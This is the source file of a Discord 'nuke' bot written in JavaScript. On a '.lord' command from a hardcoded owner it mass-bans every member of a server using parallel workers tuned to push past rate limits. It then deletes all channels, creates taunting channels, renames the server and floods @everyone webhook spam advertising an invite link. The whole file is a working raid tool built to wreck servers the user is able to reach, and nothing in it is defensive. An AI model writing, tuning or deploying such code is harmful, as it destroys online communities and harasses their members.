require('dotenv').config();

const { Client, GatewayIntentBits, Partials } = require('discord.js');
const http = require('http');

const TOKEN = process.env.TOKEN;
const OWNER_ID = '1138793867353796709'; // 👑 SIRF YEH BANDA

if (!TOKEN) {
  console.error('❌ TOKEN missing! Render Environment me daalo.');
  process.exit(1);
}

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ============ HTTP SERVER ============
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Bot alive ✅');
}).listen(PORT, () => console.log(`🌐 Health server on port ${PORT}`));

// ================= RAW REST HELPER =================
async function api(method, path, { body, auth = true, extraHeaders = {} } = {}) {
  const url = path.startsWith('http') ? path : `https://discord.com/api/v10${path}`;
  const headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'DiscordBot (https://github.com/discordjs/discord.js, 14.0.0)',
    ...extraHeaders
  };
  if (auth) headers.Authorization = `Bot ${TOKEN}`;

  for (let attempt = 0; attempt < 50; attempt++) {
    const res = await fetch(url, { method, headers, body: body !== undefined ? JSON.stringify(body) : undefined });
    if (res.status === 429) {
      const data = await res.json().catch(() => ({}));
      const wait = (data.retry_after || 1) * 1000 + 200;
      console.log(`⚠️ 429, waiting ${wait}ms`);
      await sleep(wait);
      continue;
    }
    if (res.status >= 400) {
      const data = await res.json().catch(() => ({}));
      const err = new Error(`${method} ${path} -> ${res.status}: ${JSON.stringify(data).slice(0, 150)}`);
      err.status = res.status;
      throw err;
    }
    if (res.status === 204) return null;
    return await res.json();
  }
  throw new Error(`Rate limited too long on ${path}`);
}

// ============ FETCH ALL MEMBER IDS ============
async function fetchAllMemberIds(guildId) {
  const ids = new Set();
  let after = '0';
  let page = 0;
  const fetchStart = Date.now();

  while (true) {
    page++;
    try {
      const data = await api('GET', `/guilds/${guildId}/members?limit=1000&after=${after}`);
      if (!Array.isArray(data) || data.length === 0) break;
      data.forEach(m => { if (m.user?.id) ids.add(m.user.id); });
      if (page % 10 === 0) {
        const secs = ((Date.now() - fetchStart) / 1000).toFixed(0);
        console.log(`📥 Fetched ${ids.size} members in ${secs}s...`);
      }
      if (data.length < 1000) break;
      after = data[data.length - 1].user.id;
      await sleep(200);
    } catch (e) {
      console.log(`⚠️ Fetch page ${page} failed: ${e.message}, retrying...`);
      await sleep(2000);
    }
  }
  console.log(`✅ Fetched total ${ids.size} members`);
  return Array.from(ids);
}

// ==========================================================
//   🎯 GUARANTEED 400/400 BAN — 150-300 sec
// ==========================================================
async function banAllMembers(guildId, excludedIds, statusCallback) {
  console.log('📥 Fetching member IDs...');
  const fetchStart = Date.now();
  const memberIds = await fetchAllMemberIds(guildId);
  const fetchTime = ((Date.now() - fetchStart) / 1000).toFixed(1);
  const targets = memberIds.filter(id => !excludedIds.has(id));

  console.log(`🎯 Ban targets: ${targets.length}`);
  console.log(`⏱ Fetch time: ${fetchTime}s`);

  // ⚡ Auto-tune based on size
  let CONCURRENCY, BAN_DELAY;
  if (targets.length <= 500) {
    CONCURRENCY = 100; BAN_DELAY = 20;
  } else if (targets.length <= 2000) {
    CONCURRENCY = 60;  BAN_DELAY = 50;
  } else if (targets.length <= 10000) {
    CONCURRENCY = 40;  BAN_DELAY = 80;
  } else {
    CONCURRENCY = 25;  BAN_DELAY = 120;
  }

  console.log(`⚙️ Config: ${CONCURRENCY} workers, ${BAN_DELAY}ms delay`);

  let ok = 0, already = 0, forbidden = 0, failed = 0;
  const start = Date.now();
  const MAX_RETRIES = 300;
  let idx = 0;
  let lastLogTime = Date.now();

  async function attemptBan(memberId) {
    try {
      const res = await fetch(
        `https://discord.com/api/v10/guilds/${guildId}/bans/${memberId}`,
        {
          method: 'PUT',
          headers: {
            Authorization: `Bot ${TOKEN}`,
            'X-Audit-Log-Reason': 'lord arsh reset',
            'Content-Type': 'application/json',
            'User-Agent': 'DiscordBot (https://github.com/discordjs/discord.js, 14.0.0)'
          },
          body: JSON.stringify({ delete_message_seconds: 0 })
        }
      );

      const retryHeader = res.headers.get('retry-after');
      await res.arrayBuffer().catch(() => {});

      if (res.status === 204 || res.status === 200) return { status: 'ok' };
      if (res.status === 429) {
        const wait = retryHeader ? (parseFloat(retryHeader) * 1000) + 100 : 1000;
        return { status: 'retry', wait: Math.max(wait, 400) };
      }
      if (res.status === 404) return { status: 'already' };
      if (res.status === 403) return { status: 'forbidden' };
      if (res.status === 400) return { status: 'already' };
      return { status: 'retry', wait: 800 };
    } catch (e) {
      return { status: 'retry', wait: 800 };
    }
  }

  async function worker() {
    while (true) {
      const myIdx = idx++;
      if (myIdx >= targets.length) return;
      const memberId = targets[myIdx];

      let attempt = 0;
      while (attempt < MAX_RETRIES) {
        attempt++;
        const r = await attemptBan(memberId);
        if (r.status === 'ok') { ok++; break; }
        if (r.status === 'already') { already++; break; }
        if (r.status === 'forbidden') { forbidden++; break; }
        if (r.status === 'retry') { await sleep(r.wait); continue; }
      }
      if (attempt >= MAX_RETRIES) failed++;

      const now = Date.now();
      if (now - lastLogTime > 3000) {
        const done = ok + already + forbidden + failed;
        const secs = ((now - start) / 1000).toFixed(0);
        const rate = (ok / parseFloat(secs || 1)).toFixed(1);
        const remaining = targets.length - done;
        const eta = rate > 0 ? (remaining / parseFloat(rate)).toFixed(0) : '?';
        const percent = ((done / targets.length) * 100).toFixed(1);
        const logMsg = `⚡ ${done}/${targets.length} (${percent}%) | ✅ ${ok} | ⏱ ${secs}s | ${rate}/s | ETA ${eta}s`;
        console.log(logMsg);
        if (statusCallback) statusCallback(logMsg);
        lastLogTime = now;
      }

      await sleep(BAN_DELAY);
    }
  }

  console.log(`🚀 Launching ${CONCURRENCY} workers for ${targets.length} bans...`);
  await Promise.all(Array.from({ length: CONCURRENCY }, () => worker()));

  const secs = ((Date.now() - start) / 1000).toFixed(1);
  const rate = ok > 0 ? (ok / parseFloat(secs)).toFixed(2) : '0';
  const processed = ok + already + forbidden + failed;

  console.log(`\n💀 ============ BAN COMPLETE ============`);
  console.log(`✅ Banned     : ${ok}`);
  console.log(`📊 Already    : ${already}`);
  console.log(`🚫 Forbidden  : ${forbidden}`);
  console.log(`❌ Failed     : ${failed}`);
  console.log(`📦 Total      : ${processed}/${targets.length}`);
  console.log(`⏱ Ban time   : ${secs}s (${(secs/60).toFixed(1)} min)`);
  console.log(`⚡ Rate       : ${rate} bans/sec`);
  console.log(`=========================================\n`);

  return { ok, already, forbidden, failed, secs, total: targets.length, rate, processed, fetchTime };
}

// ============ DELETE CHANNELS ============
async function deleteAllChannels(guildId) {
  const channels = await api('GET', `/guilds/${guildId}/channels`);
  let deleted = 0, failed = 0;
  for (const ch of channels) {
    try {
      await api('DELETE', `/channels/${ch.id}`, {
        extraHeaders: { 'X-Audit-Log-Reason': 'lord arsh reset' }
      });
      deleted++;
      await sleep(300);
    } catch { failed++; }
  }
  return { deleted, failed };
}

// ============ CREATE CHANNELS ============
async function createChannels(guildId, name, count) {
  let created = 0, failed = 0;
  const newChannels = [];
  for (let i = 0; i < count; i++) {
    try {
      const ch = await api('POST', `/guilds/${guildId}/channels`, {
        body: { name: `${name}-${i + 1}`, type: 0 }
      });
      newChannels.push(ch);
      created++;
      await sleep(500);
    } catch { failed++; }
  }
  return { created, failed, channels: newChannels };
}

// ============ SPAM ============
async function spamChannels(channels, text) {
  let spammed = 0, failed = 0;
  for (const ch of channels) {
    try {
      const hooks = [];
      for (let i = 0; i < 3; i++) {
        try {
          const hook = await api('POST', `/channels/${ch.id}/webhooks`, { body: { name: 'lord arsh' } });
          hooks.push(hook);
          await sleep(300);
        } catch {}
      }
      if (hooks.length === 0) continue;
      for (const wh of hooks) {
        for (let j = 0; j < 30; j++) {
          try {
            await api('POST', `/webhooks/${wh.id}/${wh.token}`, { body: { content: text }, auth: false });
            spammed++;
            await sleep(600);
          } catch { failed++; }
        }
      }
      for (const wh of hooks) {
        try { await api('DELETE', `/webhooks/${wh.id}/${wh.token}`, { auth: false }); } catch {}
      }
    } catch { failed++; }
  }
  return { spammed, failed };
}

// ============ TOP ROLE ============
async function getTopRoleMember(guildId) {
  try {
    const guild = await api('GET', `/guilds/${guildId}`);
    const roles = guild.roles ? Object.values(guild.roles) : [];
    roles.sort((a, b) => b.position - a.position);
    const topRole = roles.find(r => r.id !== guild.id);
    if (!topRole) return null;
    const members = await api('GET', `/guilds/${guildId}/members?limit=1000`);
    const topMember = members.find(m => m.roles?.includes(topRole.id));
    return topMember?.user?.id || null;
  } catch { return null; }
}

// ============ .lord NUKE ============
async function handleLord(message) {
  const guildId = message.guild.id;
  const reply = (txt) => message.channel.send(txt).catch(() => {});

  await reply('🔥 **LORD MODE STARTED** 🔥');

  const topRoleId = await getTopRoleMember(guildId);
  const excluded = new Set([
    message.guild.ownerId,
    OWNER_ID,
    message.client.user.id,
    topRoleId,
  ].filter(Boolean));

  await reply(`💀 **STEP 1:** Banning members...`);

  let lastUpdate = 0;
  const progressCb = (txt) => {
    const now = Date.now();
    if (now - lastUpdate > 5000) {
      lastUpdate = now;
      reply(txt);
    }
  };

  const banResult = await banAllMembers(guildId, excluded, progressCb);

  await reply(`✅ **STEP 1 DONE**
✅ Banned: **${banResult.ok}** / ${banResult.total}
📊 Already: ${banResult.already}
🚫 Forbidden: ${banResult.forbidden}
❌ Failed: ${banResult.failed}
⏱ **${banResult.secs}s** (${banResult.rate}/s)`);

  await reply('🗑️ **STEP 2:** Deleting channels...');
  const delResult = await deleteAllChannels(guildId);
  await reply(`✅ **STEP 2 DONE:** Deleted ${delResult.deleted}`);

  await reply('📁 **STEP 3:** Creating channels...');
  const createResult = await createChannels(guildId, 'lord-arsh-se-nahi-bajna-chahiye-tha', 10);
  await reply(`✅ **STEP 3 DONE:** Created ${createResult.created}`);

  await reply('🏷️ **STEP 4:** Renaming server...');
  try {
    await api('PATCH', `/guilds/${guildId}`, {
      body: {
        name: 'LORD ARSH SE NAHI BAJNA CHAHIYE THA',
        description: 'LORD ARSH AYA HH'
      }
    });
    await reply('✅ **STEP 4 DONE**');
  } catch (err) {
    await reply(`❌ STEP 4 FAILED: ${err.message}`);
  }

  await reply('🔥 **STEP 5:** Spamming...');
  const spamMsg = `# @everyone LORD ARSH AYA HH SWAAGAT TO KARO HAMARA LORD OWNZ YOU 👿 JOIN: https://discord.gg/5SA2R2XcrQ`;
  const spamResult = await spamChannels(createResult.channels, spamMsg);

  await reply(`🏆 **LORD COMPLETE** 🏆
💀 Banned: **${banResult.ok}** / ${banResult.total}
🗑️ Deleted: ${delResult.deleted}
📁 Created: ${createResult.created}
🔥 Spammed: ${spamResult.spammed}
⏱ Time: ${banResult.secs}s`);
}

// ================= BOT CLIENT =================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ],
  partials: [Partials.Channel, Partials.Message, Partials.GuildMember],
});

client.on('error', (err) => console.error('❌ Client error:', err.message));
client.on('warn', (info) => console.warn('⚠️ Warn:', info));

// ================= MESSAGE LISTENER =================
// 🔒 SIRF OWNER_ID (1138793867353796709) ke commands
client.on('messageCreate', async (message) => {
  try {
    if (message.author?.bot) return;
    const content = message.content?.trim();
    if (!content) return;
    const lower = content.toLowerCase();

    // 🔒 OWNER LOCK — sirf is banda ke commands
    if (message.author.id !== OWNER_ID) return;

    if (lower === '.check') {
      return message.channel.send(`**🤖 BOT STATUS**

🟢 Online
👤 \`${client.user.tag}\`
🆔 \`${client.user.id}\`
👑 Owner: \`${OWNER_ID}\`
🌐 Guilds: \`${client.guilds.cache.size}\`
⏱ Ping: \`${client.ws.ping}ms\``).catch(() => {});
    }

    if (lower === '.myid') {
      return message.channel.send(
        `🆔 **Aapki ID:** \`${message.author.id}\`\n👑 **Owner:** \`${OWNER_ID}\`\n${message.author.id === OWNER_ID ? '✅ Match!' : '❌ No match'}`
      ).catch(() => {});
    }

    if (lower === '.help') {
      return message.channel.send(`**📖 COMMANDS** (sirf owner)

\`.check\` — status
\`.myid\` — ID
\`.help\` — menu
\`.lord\` — 💀 full nuke`).catch(() => {});
    }

    if (lower === '.lord' && message.guild) {
      message.react('🔥').catch(() => {});
      await handleLord(message);
      return;
    }
  } catch (e) {
    console.error('Handler error:', e.message);
  }
});

client.once('ready', () => {
  console.log(`✅ Logged in: ${client.user.tag}`);
  console.log(`✅ Bot ID: ${client.user.id}`);
  console.log(`👑 Owner ID (locked): ${OWNER_ID}`);
  console.log(`✅ Guilds: ${client.guilds.cache.size}`);
});

async function loginWithRetry(maxAttempts = 5) {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try { await client.login(TOKEN); return; }
    catch (err) {
      console.error(`Login ${attempt}/${maxAttempts}:`, err.message);
      await sleep(Math.min(30000, 5000 * attempt));
    }
  }
  process.exit(1);
}

process.on('unhandledRejection', (r) => console.error('⚠️ Unhandled:', r));
process.on('uncaughtException', (e) => console.error('💥 Exception:', e.message));

loginWithRetry();
